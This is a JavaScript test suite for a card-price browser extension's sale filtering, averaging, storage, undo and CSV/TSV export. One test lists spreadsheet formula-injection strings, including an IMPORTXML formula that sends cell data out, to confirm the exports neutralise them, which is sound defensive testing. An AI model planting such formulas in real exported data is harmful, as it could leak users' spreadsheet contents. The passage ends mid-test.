"use strict";
// node test.js
const assert = require("assert");

// minimal chrome.storage.local stub - must exist before background.js is required.
// get() clones, exactly as the real API does: handing back a live reference would let
// two racing readers share one object and quietly paper over lost-update bugs.
const clone = v => (v === undefined ? undefined : JSON.parse(JSON.stringify(v)));
global.chrome = {
  storage: {
    local: {
      _d: {},
      async get(k) { return this._d[k] === undefined ? {} : { [k]: clone(this._d[k]) }; },
      async set(o) { Object.assign(this._d, clone(o)); },
      async remove(k) { delete this._d[k]; }
    }
  }
};

const bg = require("./background.js");
// The content script's money arithmetic and printed document are pure and exported for
// exactly this: the customer-facing sheet must be held to the same standard as the CSV.
const ui = require("./content.js");

// no network in tests; the FX path is exercised through its failure branch
global.fetch = () => { throw new Error("offline in tests"); };

const NOW = Date.parse("2026-07-27T00:00:00Z");
const FX = { rate: 1.3750, at: "2026-07-27T00:00:00.000Z" };
const daysAgo = n => new Date(NOW - n * 86400000).toISOString();

const SEL = { condition: "Near Mint", variant: "Holofoil", language: "English" };
const META = {
  name: "Charizard ex - 223/197",
  set: "SV: Obsidian Flames",
  number: "223/197",
  url: "https://www.tcgplayer.com/product/489103/pokemon-sv-charizard-ex"
};

// Fixture shaped from the live /v2/product/{id}/latestsales response. The five
// matching purchasePrices sum to 63.50, so the hand-computed mean is 12.70.
const FIXTURE = [
  { condition: "Near Mint", variant: "Holofoil", language: "English", quantity: 1,
    purchasePrice: 12.50, shippingPrice: 1.29, orderDate: daysAgo(1),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" },
  { condition: "Near Mint", variant: "Holofoil", language: "English", quantity: 3,
    purchasePrice: 13.00, shippingPrice: 0.00, orderDate: daysAgo(2),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" },
  { condition: "Near Mint", variant: "Holofoil", language: "English", quantity: 1,
    purchasePrice: 11.75, shippingPrice: 4.99, orderDate: daysAgo(3),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" },
  { condition: "Near Mint", variant: "Holofoil", language: "English", quantity: 2,
    purchasePrice: 14.25, shippingPrice: 1.29, orderDate: daysAgo(4),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" },
  { condition: "Near Mint", variant: "Holofoil", language: "English", quantity: 1,
    purchasePrice: 12.00, shippingPrice: 12.00, orderDate: daysAgo(5),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" },
  // rejects
  { condition: "Near Mint", variant: "Holofoil", language: "English", quantity: 1,
    purchasePrice: 99.99, shippingPrice: 0, orderDate: daysAgo(1),
    listingType: "ListingWithPhotos", title: "Charizard ex - 223/197" },
  { condition: "Near Mint", variant: "Reverse Holofoil", language: "English", quantity: 1,
    purchasePrice: 88.88, shippingPrice: 0, orderDate: daysAgo(1),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" },
  { condition: "Near Mint", variant: "Holofoil", language: "Japanese", quantity: 1,
    purchasePrice: 77.77, shippingPrice: 0, orderDate: daysAgo(1),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" },
  { condition: "Lightly Played", variant: "Holofoil", language: "English", quantity: 1,
    purchasePrice: 66.66, shippingPrice: 0, orderDate: daysAgo(1),
    listingType: "ListingWithoutPhotos", title: "Charizard ex - 223/197" }
];

const MATCHING = FIXTURE.filter(r => bg.matchesSelection(r, SEL));
const withPhotos = FIXTURE[5], reverseHolo = FIXTURE[6], japanese = FIXTURE[7];

let passed = 0;
function ok(name, fn) {
  fn();
  passed++;
  console.log("ok  " + name);
}

// 1
ok("ListingWithPhotos row rejected", () => {
  assert.strictEqual(bg.matchesSelection(withPhotos, SEL), false);
});

// 2
ok('variant "Reverse Holofoil" rejected when selection was "Holofoil"', () => {
  assert.strictEqual(bg.matchesSelection(reverseHolo, SEL), false);
});

// 3
ok("language mismatch rejected", () => {
  assert.strictEqual(bg.matchesSelection(japanese, SEL), false);
  assert.strictEqual(MATCHING.length, 5);
});

// 4
ok("mean of 5 known purchasePrice values matches hand-computed 12.70", () => {
  const row = bg.buildRow(META, SEL, MATCHING, FX, NOW);
  assert.strictEqual(row.avg_usd, "12.70");
  assert.strictEqual(row._samples, 5);
});

// 5 is async - see main()

// 6
ok("sale-row quantity 3 counts as exactly 1 sample", () => {
  assert.strictEqual(MATCHING.filter(r => r.quantity === 3).length, 1);
  const row = bg.buildRow(META, SEL, MATCHING, FX, NOW);
  // quantities are 1+3+1+2+1 = 8 cards sold, but 5 sample rows
  assert.strictEqual(row._samples, 5);
  assert.strictEqual(row.avg_usd, "12.70");
});

// 7
ok("shippingPrice never affects the average", () => {
  const inflated = MATCHING.map(r => Object.assign({}, r, { shippingPrice: 500 }));
  assert.strictEqual(
    bg.buildRow(META, SEL, MATCHING, FX, NOW).avg_usd,
    bg.buildRow(META, SEL, inflated, FX, NOW).avg_usd);
  assert.strictEqual(bg.buildRow(META, SEL, inflated, FX, NOW).avg_usd, "12.70");
});

// 8
ok("export columns fixed; cad = avg_usd * rate; no $ or separators", () => {
  assert.deepStrictEqual(bg.COLUMNS,
    ["name", "set", "number", "printing", "condition", "avg_usd", "cad", "qty"]);
  const row = bg.buildRow(META, SEL, MATCHING, FX, NOW);
  const csv = bg.toDelimited([row], ",");
  const [header, line] = csv.split("\r\n");
  assert.strictEqual(header, "name,set,number,printing,condition,avg_usd,cad,qty");
  assert.strictEqual(row.cad, (12.70 * 1.3750).toFixed(2));
  assert.strictEqual(row._fx_rate, "1.3750");
  assert.ok(!csv.includes("$"));
  assert.ok(line.endsWith(",12.70,17.46,1"));
  // quoting for a field containing the delimiter
  assert.ok(bg.toDelimited([Object.assign({}, row, { set: "A, B" })], ",")
    .split("\r\n")[1].includes('"A, B"'));
  // tab variant pastes into Sheets without an import dialog
  const tsv = bg.toDelimited([row], "\t");
  assert.strictEqual(tsv.split("\r\n")[0].split("\t").length, 8);
  assert.ok(!tsv.split("\r\n")[1].includes('"'));
});

// 9
ok("oldest sale 61 days -> _stale true, 59 days -> false", () => {
  const one = ts => [Object.assign({}, MATCHING[0], { orderDate: ts })];
  assert.strictEqual(bg.buildRow(META, SEL, one(daysAgo(61)), FX, NOW)._stale, true);
  assert.strictEqual(bg.buildRow(META, SEL, one(daysAgo(59)), FX, NOW)._stale, false);
  assert.strictEqual(bg.buildRow(META, SEL, one(daysAgo(61)), FX, NOW)._oldest,
    daysAgo(61).slice(0, 10));
});

async function main() {
  // 5 - only 3 matching rows across two pages
  {
    const pages = [
      { previousPage: "", nextPage: "Yes", resultCount: 25, totalResults: 30,
        data: [MATCHING[0], MATCHING[1], withPhotos, reverseHolo] },
      { previousPage: "Yes", nextPage: "", resultCount: 5, totalResults: 30,
        data: [MATCHING[2], japanese] }
    ];
    const asked = [];
    const res = await bg.collectSales("1", SEL, (_id, offset, conditions) => {
      asked.push({ offset, conditions });
      return Promise.resolve(pages[offset / 25]);
    });
    assert.deepStrictEqual(asked.map(a => a.offset), [0, 25], "offset steps by 25");
    assert.deepStrictEqual(asked[0].conditions, ["Near Mint"],
      "selected condition passed to the server-side filter");
    assert.strictEqual(res.matched.length, 3);
    assert.strictEqual(res.rejected, 3);
    const row = bg.buildRow(META, SEL, res.matched, FX, NOW);
    assert.strictEqual(row._samples, 3);
    const csv = bg.toDelimited([row], ",");
    assert.strictEqual(csv.split("\r\n").length, 2, "row still exported");
    passed++;
    console.log("ok  (async) only 3 matching rows -> 3 samples, row still exported");
  }

  // 10 - paging stops when nextPage is ""
  {
    let calls = 0;
    const page = { previousPage: "", nextPage: "", resultCount: 2, totalResults: 2,
                   data: [MATCHING[0], withPhotos] };
    const res = await bg.collectSales("1", SEL, () => { calls++; return Promise.resolve(page); });
    assert.strictEqual(calls, 1, 'must not page past nextPage ""');
    assert.strictEqual(res.matched.length, 1);
    assert.strictEqual(res.capped, false);

    let calls2 = 0;
    const busy = { previousPage: "", nextPage: "Yes", resultCount: 25, totalResults: 999,
                   data: [withPhotos] };
    const res2 = await bg.collectSales("1", SEL, () => { calls2++; return Promise.resolve(busy); });
    assert.strictEqual(calls2, bg.MAX_PAGES);
    assert.strictEqual(res2.capped, true);
    passed++;
    console.log('ok  (async) paging stops when nextPage is ""; caps at 10 pages');
  }

  // 11 - FX fetch throws (global.fetch throws for the whole suite; no network in tests)
  {
    const fx = await bg.getFx();
    assert.strictEqual(fx.rate, null);
    const row = bg.buildRow(META, SEL, MATCHING, fx, NOW);
    assert.strictEqual(row.cad, "", "cad empty, never 0 and never 1.0");
    assert.strictEqual(row._fx_rate, "");
    assert.strictEqual(row.avg_usd, "12.70", "USD side still works");
    const csv = bg.toDelimited([row], ",");
    assert.strictEqual(csv.split("\r\n").length, 2, "export still succeeds");
    assert.ok(csv.split("\r\n")[1].endsWith(",12.70,,1"));
    passed++;
    console.log("ok  (async) FX fetch throws -> export succeeds, cad empty");
  }

  // 12 - re-adding overwrites the price but keeps the qty you typed
  {
    chrome.storage.local._d = {};
    const one = { previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
                  data: MATCHING };
    const msg = { productId: "489103", sel: SEL, meta: META };
    const first = await bg.collect(msg, () => Promise.resolve(one));
    assert.strictEqual(first.ok, true);
    assert.strictEqual(first.key, "489103|Holofoil|Near Mint|English");

    // same product, same printing, same grade, different language: a separate row,
    // NOT an overwrite of the English one
    const jpSel = Object.assign({}, SEL, { language: "Japanese" });
    const jpRows = MATCHING.map(r => Object.assign({}, r, { language: "Japanese", purchasePrice: 30 }));
    const jp = await bg.collect({ productId: "489103", sel: jpSel, meta: META },
      () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
                              data: jpRows }));
    assert.strictEqual(jp.key, "489103|Holofoil|Near Mint|Japanese");
    assert.strictEqual((await bg.handle({ type: "count" })).count, 2, "languages do not collide");
    await bg.handle({ type: "remove", key: jp.key });

    await bg.handle({ type: "setQty", key: first.key, qty: "4" });
    assert.strictEqual((await bg.handle({ type: "list" })).rows[0].qty, 4);

    // fresh pull at a different price
    const dearer = { previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
                     data: MATCHING.map(r => Object.assign({}, r, { purchasePrice: 20 })) };
    await bg.collect(msg, () => Promise.resolve(dearer));
    const after = (await bg.handle({ type: "list" })).rows;
    assert.strictEqual(after.length, 1, "overwrite, not a duplicate");
    assert.strictEqual(after[0].avg_usd, "20.00", "price refreshed");
    assert.strictEqual(after[0].qty, 4, "qty survives the refresh");
    assert.strictEqual(after[0].cad, "", "FX down in tests, so cad stays empty");

    assert.strictEqual((await bg.handle({ type: "setQty", key: first.key, qty: "0" })).qty, 1,
      "qty clamps to at least 1");

    await bg.handle({ type: "remove", key: first.key });
    assert.strictEqual((await bg.handle({ type: "count" })).count, 0);
    passed++;
    console.log("ok  (async) re-add overwrites price, keeps qty; setQty clamps; remove works");
  }

  // 13 - server-side condition filter, and its permanent fallback on 400
  {
    const sent = [];
    global.fetch = async (url, opts) => {
      const body = JSON.parse(opts.body);
      sent.push(body);
      // first call rejects the string conditions the way `variants` does
      if (sent.length === 1) return { ok: false, status: 400, json: async () => ({}) };
      return { ok: true, status: 200,
               json: async () => ({ nextPage: "", totalResults: 1, data: [MATCHING[0]] }) };
    };

    const page = await bg.fetchSalesPage("1", 0, ["Near Mint"]);
    assert.deepStrictEqual(sent[0].conditions, ["Near Mint"], "filter attempted");
    assert.deepStrictEqual(sent[1].conditions, [], "retried unfiltered after the 400");
    assert.strictEqual(page.data.length, 1, "caller still gets a page");

    await bg.fetchSalesPage("1", 25, ["Damaged"]);
    assert.deepStrictEqual(sent[2].conditions, [], "filter stays off for the session");
    assert.strictEqual(sent[2].offset, 25);
    assert.deepStrictEqual(sent[2].variants, [], "variants always empty - 400s on strings");

    global.fetch = () => { throw new Error("offline in tests"); };
    passed++;
    console.log("ok  (async) server condition filter falls back permanently on 400");
  }

  const page5 = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5,
                                        totalResults: 5, data: MATCHING });

  // 14 - two collects fired at once both land. The storage stub is deliberately slow
  // on read: with an unserialized loadStore -> mutate -> saveStore, the second write
  // is built on a snapshot taken before the first one landed and drops its row.
  {
    chrome.storage.local._d = {};
    // The snapshot is taken when the read STARTS and delivered 8ms later - a slow read,
    // not a late one. Two readers that overlap therefore see the same starting state.
    const fast = chrome.storage.local.get;
    chrome.storage.local.get = function (k) {
      const snap = fast.call(this, k);
      return new Promise(r => setTimeout(() => r(snap), 8)).then(() => snap);
    };

    const a = bg.collect({ productId: "1", sel: SEL, meta: META }, page5);
    const b = bg.collect({ productId: "2", sel: SEL, meta: META }, page5);
    const [ra, rb] = await Promise.all([a, b]);
    assert.strictEqual(ra.ok && rb.ok, true);

    const keys = (await bg.handle({ type: "list" })).rows.map(r => r.key);
    assert.strictEqual(keys.length, 2, "both concurrent collects survived");
    assert.deepStrictEqual(keys.slice().sort(),
      ["1|Holofoil|Near Mint|English", "2|Holofoil|Near Mint|English"]);

    // three more at once, on top of the two already stored
    await Promise.all(["3", "4", "5"].map(id =>
      bg.collect({ productId: id, sel: SEL, meta: META }, page5)));
    assert.strictEqual((await bg.handle({ type: "count" })).count, 5, "no interleaved loss");

    chrome.storage.local.get = fast;
    passed++;
    console.log("ok  (async) concurrent collects are serialized, no row lost");
  }

  // 15 - a plain re-add adds a copy; shift-click (mode anything else) does not
  {
    chrome.storage.local._d = {};
    const msg = { productId: "489103", sel: SEL, meta: META };
    const first = await bg.collect(Object.assign({ mode: "bump" }, msg), page5);
    assert.strictEqual(first.qty, 1);
    assert.strictEqual(first.mode, "added", "first add is not an increment");

    const second = await bg.collect(Object.assign({ mode: "bump" }, msg), page5);
    assert.strictEqual(second.mode, "incremented");
    assert.strictEqual(second.qty, 2);
    const third = await bg.collect(Object.assign({ mode: "bump" }, msg), page5);
    assert.strictEqual(third.qty, 3);
    assert.strictEqual((await bg.handle({ type: "count" })).count, 1, "still one row");

    // refresh path leaves the count alone
    const dearer = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5,
      totalResults: 5, data: MATCHING.map(r => Object.assign({}, r, { purchasePrice: 20 })) });
    const ref = await bg.collect(Object.assign({ mode: "refresh" }, msg), dearer);
    assert.strictEqual(ref.mode, "refreshed");
    assert.strictEqual(ref.qty, 3, "shift-click never changes the count");
    const rows = (await bg.handle({ type: "list" })).rows;
    assert.strictEqual(rows[0].avg_usd, "20.00", "price still re-pulled on the refresh path");
    passed++;
    console.log("ok  (async) re-add increments qty; refresh mode leaves it alone");
  }

  // 16 - refresh all re-prices every row while keeping qty and per-row % overrides
  {
    chrome.storage.local._d = {};
    const a = await bg.collect({ productId: "1", sel: SEL, meta: META }, page5);
    const jpSel = Object.assign({}, SEL, { language: "Japanese" });
    const b = await bg.collect({ productId: "2", sel: jpSel, meta: META }, () =>
      Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
        data: MATCHING.map(r => Object.assign({}, r, { language: "Japanese" })) }));

    await bg.handle({ type: "setQty", key: a.key, qty: "7" });
    await bg.handle({ type: "setQty", key: b.key, qty: "2" });
    assert.strictEqual((await bg.handle({ type: "setPct", key: a.key, pct: "62.5" })).pct, 62.5);

    // one page carrying both languages at the new price: each row must still pick out
    // only the sales matching its own selection
    const both = MATCHING.map(r => Object.assign({}, r, { purchasePrice: 20 }))
      .concat(MATCHING.map(r => Object.assign({}, r, { purchasePrice: 20, language: "Japanese" })));
    // handle("refreshAll") now answers { started: true } and finishes in the background,
    // so the start-and-wait helper is what a synchronous test wants. Same run machinery.
    const res = await bg.refreshAll(() =>
      Promise.resolve({ previousPage: "", nextPage: "", resultCount: 10, totalResults: 10,
        data: both }));
    assert.strictEqual(res.refreshed, 2);
    assert.strictEqual(res.failed, 0);
    assert.strictEqual(res.count, 2, "refresh all never adds or drops a row");

    const by = {};
    for (const r of (await bg.handle({ type: "list" })).rows) by[r.key] = r;
    assert.strictEqual(by[a.key].avg_usd, "20.00", "prices re-pulled");
    assert.strictEqual(by[b.key].avg_usd, "20.00");
    assert.strictEqual(by[a.key].qty, 7, "qty preserved");
    assert.strictEqual(by[b.key].qty, 2);
    assert.strictEqual(by[a.key]._pct, 62.5, "per-row % override preserved");
    assert.strictEqual(by[b.key]._pct, undefined, "a row with no override stays without one");
    assert.strictEqual(by[b.key]._language, "Japanese", "language survives the round trip");

    // clearing an override drops the field rather than pinning today's global
    await bg.handle({ type: "setPct", key: a.key, pct: "" });
    assert.strictEqual((await bg.handle({ type: "list" })).rows
      .find(r => r.key === a.key)._pct, undefined);
    passed++;
    console.log("ok  (async) refresh all re-prices every row, keeping qty and % overrides");
  }

  // 17 - drawer order is newest first by _addedAt, not lexicographic by key
  {
    chrome.storage.local._d = {};
    const at = (key, iso) => ({ [key]: { name: key, _addedAt: iso, avg_usd: "1.00", cad: "" } });
    await bg.handle({ type: "restore", store: Object.assign(
      at("z|a", "2026-07-01T00:00:00.000Z"),
      at("a|a", "2026-07-03T00:00:00.000Z"),
      at("m|a", "2026-07-02T00:00:00.000Z")) });
    assert.deepStrictEqual((await bg.handle({ type: "list" })).rows.map(r => r.key),
      ["a|a", "m|a", "z|a"], "newest _addedAt first");

    // a fresh collect is stamped now, so it goes to the top
    const fresh = await bg.collect({ productId: "9", sel: SEL, meta: META }, page5);
    assert.strictEqual((await bg.handle({ type: "list" })).rows[0].key, fresh.key,
      "the row you just touched is the top row");

    // undo restores the exact prior store
    const before = (await bg.handle({ type: "list" })).rows.length;
    const cleared = await bg.handle({ type: "clear" });
    assert.strictEqual(cleared.cleared, before);
    assert.strictEqual((await bg.handle({ type: "count" })).count, 0);
    await bg.handle({ type: "restore", store: cleared.prev });
    assert.strictEqual((await bg.handle({ type: "count" })).count, before, "undo puts it back");

    const gone = await bg.handle({ type: "remove", key: fresh.key });
    assert.strictEqual(gone.name, META.name, "remove reports what it removed");
    await bg.handle({ type: "restore", store: gone.prev });
    assert.strictEqual((await bg.handle({ type: "count" })).count, before,
      "per-row undo puts it back too");
    passed++;
    console.log("ok  (async) rows sort newest first; clear and remove are undoable");
  }

  // 18 - THE core rule, previously untested: the average is the 5 MOST RECENT sales.
  // Every earlier fixture had exactly 5 matching rows already in newest-first order, so
  // deleting the sort or the cap changed nothing and the suite stayed green. This one is
  // 8 sales in scrambled order with prices chosen so the recent five, the array's first
  // five, the oldest five and all eight each give a different mean.
  {
    const sale = (d, p) => Object.assign({}, MATCHING[0],
      { orderDate: daysAgo(d), purchasePrice: p });
    // recent 5 (days 1-5): 30 + 20 + 40 + 60 + 50 = 200 -> 40.00
    // first 5 in array order:            1 + 20 + 2 + 30 + 50 = 103 -> 20.60
    // oldest 5 (days 200,90,7,5,4):      3 + 2 + 1 + 50 + 60  = 116 -> 23.20
    // all 8:                                             206 / 8 -> 25.75
    const scrambled = [
      sale(7, 1.00), sale(2, 20.00), sale(90, 2.00), sale(1, 30.00),
      sale(5, 50.00), sale(3, 40.00), sale(200, 3.00), sale(4, 60.00)
    ];
    const row = bg.buildRow(META, SEL, scrambled, FX, NOW);

    assert.strictEqual(row.avg_usd, "40.00",
      "mean of the 5 MOST RECENT sales, not the first 5 and not all 8");
    assert.strictEqual(row._samples, 5, "never more than 5 samples, however many matched");
    assert.strictEqual(row._oldest, daysAgo(5).slice(0, 10),
      "oldest USED sale is the 5th newest - the day-200 sale is not in the average");
    assert.strictEqual(row._stale, false,
      "staleness is judged on the sales actually used, not on the ones dropped");
    assert.strictEqual(row.cad, (40.00 * 1.3750).toFixed(2));

    // the same 8 in newest-first order must give the identical answer: the result is a
    // property of the data, not of the order it arrived in
    const sorted = scrambled.slice()
      .sort((a, b) => Date.parse(b.orderDate) - Date.parse(a.orderDate));
    assert.strictEqual(bg.buildRow(META, SEL, sorted, FX, NOW).avg_usd, "40.00");
    assert.strictEqual(bg.buildRow(META, SEL, scrambled.slice().reverse(), FX, NOW).avg_usd,
      "40.00");

    // and when the 5 most recent reach past the staleness line, the flag follows them:
    // 6 sales, the newest 5 ending at day 61
    const old6 = [sale(61, 10), sale(1, 10), sale(400, 99), sale(3, 10),
                  sale(2, 10), sale(4, 10)];
    const oldRow = bg.buildRow(META, SEL, old6, FX, NOW);
    assert.strictEqual(oldRow._samples, 5);
    assert.strictEqual(oldRow._oldest, daysAgo(61).slice(0, 10),
      "the day-400 sale is dropped by the cap; day 61 is the oldest used");
    assert.strictEqual(oldRow._stale, true);
    assert.strictEqual(oldRow.avg_usd, "10.00", "the 99.00 outlier is out of the window");

    passed++;
    console.log("ok  (async) average uses the 5 most recent of 8 unsorted sales");
  }

  // 19 - undo is surgical. The old undo replaced the whole store with a snapshot, so a
  // row collected after the delete was silently destroyed by hitting Undo.
  {
    chrome.storage.local._d = {};
    const a = await bg.collect({ productId: "10", sel: SEL, meta: META }, page5);
    const gone = await bg.handle({ type: "remove", key: a.key });
    assert.strictEqual(gone.ok, true);
    assert.deepStrictEqual(gone.keys, [a.key], "remove names exactly what it removed");

    // ...now collect a DIFFERENT card inside the undo window
    const b = await bg.collect({ productId: "11", sel: SEL, meta: META }, page5);
    assert.strictEqual((await bg.handle({ type: "count" })).count, 1);

    await bg.handle({ type: "restore", store: gone.prev, keys: gone.keys });
    const keys = (await bg.handle({ type: "list" })).rows.map(r => r.key).sort();
    assert.deepStrictEqual(keys, [a.key, b.key].sort(),
      "undo brings back the deleted row WITHOUT destroying the one collected since");

    // a key that came back on its own is never overwritten by the older snapshot
    chrome.storage.local._d = {};
    const c = await bg.collect({ productId: "12", sel: SEL, meta: META }, page5);
    const gone2 = await bg.handle({ type: "remove", key: c.key });
    const dearer = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5,
      totalResults: 5, data: MATCHING.map(r => Object.assign({}, r, { purchasePrice: 99 })) });
    await bg.collect({ productId: "12", sel: SEL, meta: META }, dearer);
    const und = await bg.handle({ type: "restore", store: gone2.prev, keys: gone2.keys });
    assert.strictEqual(und.restored, 0);
    assert.strictEqual(und.kept, 1, "the re-collected row is left alone");
    assert.strictEqual((await bg.handle({ type: "list" })).rows[0].avg_usd, "99.00",
      "undo must not roll a row back to a stale price");

    // clear-all undo is equally surgical
    chrome.storage.local._d = {};
    await bg.collect({ productId: "13", sel: SEL, meta: META }, page5);
    await bg.collect({ productId: "14", sel: SEL, meta: META }, page5);
    const cleared = await bg.handle({ type: "clear" });
    const fresh = await bg.collect({ productId: "15", sel: SEL, meta: META }, page5);
    await bg.handle({ type: "restore", store: cleared.prev, keys: cleared.keys });
    assert.strictEqual((await bg.handle({ type: "count" })).count, 3,
      "undoing a clear restores the 2 cleared rows and keeps the 1 collected since");
    assert.ok((await bg.handle({ type: "list" })).rows.some(r => r.key === fresh.key));
    passed++;
    console.log("ok  (async) undo re-inserts only what it removed, never clobbering newer rows");
  }

  // 20 - refresh during an FX outage must not blank every CAD price in the collection.
  // There is no undo for a refresh, so a wipe here is permanent.
  {
    chrome.storage.local._d = {};
    const key = "77|Holofoil|Near Mint|English";
    await bg.handle({ type: "restore", store: { [key]: {
      name: META.name, set: META.set, number: META.number,
      printing: "Holofoil", condition: "Near Mint", _language: "English", _url: META.url,
      avg_usd: "12.70", cad: "17.46", qty: 3, _pct: 55,
      _fx_rate: "1.3750", _fx_at: "2026-07-20T00:00:00.000Z",
      _addedAt: "2026-07-20T00:00:00.000Z"
    } } });

    // FX is down for the whole suite (global.fetch throws), prices moved to 20.00
    const dearer = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5,
      totalResults: 5, data: MATCHING.map(r => Object.assign({}, r, { purchasePrice: 20 })) });
    const res = await bg.refreshAll(dearer);

    const row = (await bg.handle({ type: "list" })).rows[0];
    assert.strictEqual(row.avg_usd, "20.00", "the USD side still refreshes");
    assert.notStrictEqual(row.cad, "", "CAD is NOT blanked by an exchange-rate outage");
    assert.strictEqual(row._fx_rate, "1.3750", "the last known rate is kept");
    assert.strictEqual(row._fx_at, "2026-07-20T00:00:00.000Z",
      "and keeps its original timestamp, so the drawer can show how old it is");
    assert.strictEqual(row.cad, (20 * 1.3750).toFixed(2),
      "re-priced at the kept rate, so cad = avg_usd * _fx_rate still holds");
    assert.strictEqual(row._fx_stale, true);
    assert.strictEqual(row.qty, 3, "qty untouched");
    assert.strictEqual(row._pct, 55, "per-row % untouched");

    assert.strictEqual(res.fxFailed, 1, "the outage is counted");
    assert.strictEqual(res.partial, true, "and reported as a partial refresh, not a success");
    passed++;
    console.log("ok  (async) FX outage during refresh preserves CAD and reports partial");
  }

  // 21 - a row deleted while the refresh is paging must stay deleted. The key list comes
  // from a read taken outside the mutation queue, so it goes stale the moment you delete.
  {
    chrome.storage.local._d = {};
    const a = await bg.collect({ productId: "20", sel: SEL, meta: META }, page5);
    const b = await bg.collect({ productId: "21", sel: SEL, meta: META }, page5);
    await bg.handle({ type: "setQty", key: b.key, qty: "9" });
    await bg.handle({ type: "setPct", key: b.key, pct: "45" });

    let deleted = false;
    const res = await bg.refreshAll(async () => {
      // delete the OTHER row mid-refresh, exactly as a click in the drawer would
      if (!deleted) { deleted = true; await bg.handle({ type: "remove", key: b.key }); }
      return { previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
               data: MATCHING };
    });

    const rows = (await bg.handle({ type: "list" })).rows;
    assert.strictEqual(rows.length, 1, "the deleted row is NOT resurrected by the refresh");
    assert.strictEqual(rows[0].key, a.key);
    assert.strictEqual(res.skipped, 1, "the skip is reported");
    assert.strictEqual(res.refreshed, 1);
    assert.strictEqual(res.failed, 0, "a deliberate delete is not a failure");
    passed++;
    console.log("ok  (async) refresh skips rows deleted while it was running");
  }

  // 22 - double-clicking the trash used to return ok twice, and the second toast (whose
  // snapshot no longer held the row) replaced the only undo that could restore it.
  {
    chrome.storage.local._d = {};
    const a = await bg.collect({ productId: "30", sel: SEL, meta: META }, page5);
    const first = await bg.handle({ type: "remove", key: a.key });
    const second = await bg.handle({ type: "remove", key: a.key });

    assert.strictEqual(first.ok, true);
    assert.strictEqual(second.ok, false, "removing an absent key is not a success");
    assert.strictEqual(second.prev, undefined,
      "and carries no snapshot that could replace the live undo");

    // the first response is still a working undo
    await bg.handle({ type: "restore", store: first.prev, keys: first.keys });
    assert.strictEqual((await bg.handle({ type: "count" })).count, 1,
      "the row is still recoverable after the second click");
    passed++;
    console.log("ok  (async) a second delete of the same row is a no-op, undo survives");
  }

  // 23 - a card name is attacker-supplied text from a marketplace listing. Leading
  // = + - @ makes it a live formula in Sheets/Excel, on BOTH export paths.
  {
    const evil = [
      "=IMPORTXML(CONCAT(\"//x?\",A1),\"//a\")",
      "+1+1",
      "-2+3",
      "@SUM(1,2)",
      "=1+1,with a comma"
    ];
    for (const name of evil) {
      const row = Object.assign(bg.buildRow(META, SEL, MATCHING, FX, NOW), { name });
      const csvLine = bg.toDelimited([row], ",").split("\r\n")[1];
      const tsvLine = bg.toDelimited([row], "\t").split("\r\n")[1];
      const csvFirst = csvLine[0] === '"' ? csvLine.slice(1) : csvLine;
      assert.strictEqual(csvFirst[0], "'", `CSV must neutralise ${name}`);
      assert.strictEqual(tsvLine[0], "'", `TSV must neutralise ${name}`);
      // the text itself is still there, just inert (quotes doubled per RFC 4180)
      assert.ok(csvLine.includes(name.replace(/"/g, '""').split(",")[0]),
        `text preserved for ${name}`);
    }
    // ordinary names are untouched
    const plain = bg.buildRow(META, SEL, MATCHING, FX, NOW);
    assert.ok(bg.toDelimited([plain], ",").split("\r\n")[1].startsWith("Charizard"));
    assert.ok(!bg.toDelimited([plain], "\t").includes("'"));
    // a tab or newline inside a name cannot split the TSV row
    const messy = Object.assign({}, plain, { name: "a\tb\nc" });
    assert.strictEqual(bg.toDelimited([messy], "\t").split("\r\n").length, 2);
    assert.strictEqual(bg.toDelimited([messy], "\t").split("\r\n")[1].split("\t").length,
      bg.COLUMNS.length);
    passed++;
    console.log("ok  (async) formula injection neutralised on the CSV and clipboard paths");
  }

  // 24 - the API's field types are not a promise. A null price must never become 0.00 and
  // a malformed date must never throw a RangeError at the user.
  {
    const bad = (over) => Object.assign({}, MATCHING[0], over);
    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: null })), false);
    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: undefined })), false);
    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: "" })), false);
    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: "n/a" })), false);
    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: NaN })), false);
    assert.strictEqual(bg.isUsableSale(bad({ orderDate: "not a date" })), false);
    assert.strictEqual(bg.isUsableSale(bad({ orderDate: null })), false);
    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: 12.5 })), true);
    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: "12.50" })), true,
      "a numeric string is read, but nothing else is");

    // bad rows are dropped from the average rather than poisoning it
    const mixed = [bad({ purchasePrice: 10, orderDate: daysAgo(1) }),
                   bad({ purchasePrice: null, orderDate: daysAgo(2) }),
                   bad({ purchasePrice: 20, orderDate: daysAgo(3) }),
                   bad({ purchasePrice: 999, orderDate: "yesterday-ish" })];
    const row = bg.buildRow(META, SEL, mixed, FX, NOW);
    assert.strictEqual(row.avg_usd, "15.00", "mean of the two readable sales only");
    assert.strictEqual(row._samples, 2);
    assert.ok(!row.avg_usd.includes("NaN"));

    // a malformed date raises a clear message, not a raw RangeError
    assert.throws(() => bg.buildRow(META, SEL, [bad({ orderDate: "garbage" })], FX, NOW),
      /readable purchase price and order date/);
    assert.throws(() => bg.buildRow(META, SEL, [bad({ purchasePrice: null })], FX, NOW),
      /readable purchase price and order date/);

    // and the collect path turns that into a refusal, not a stored 0.00 row
    chrome.storage.local._d = {};
    const junk = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 2,
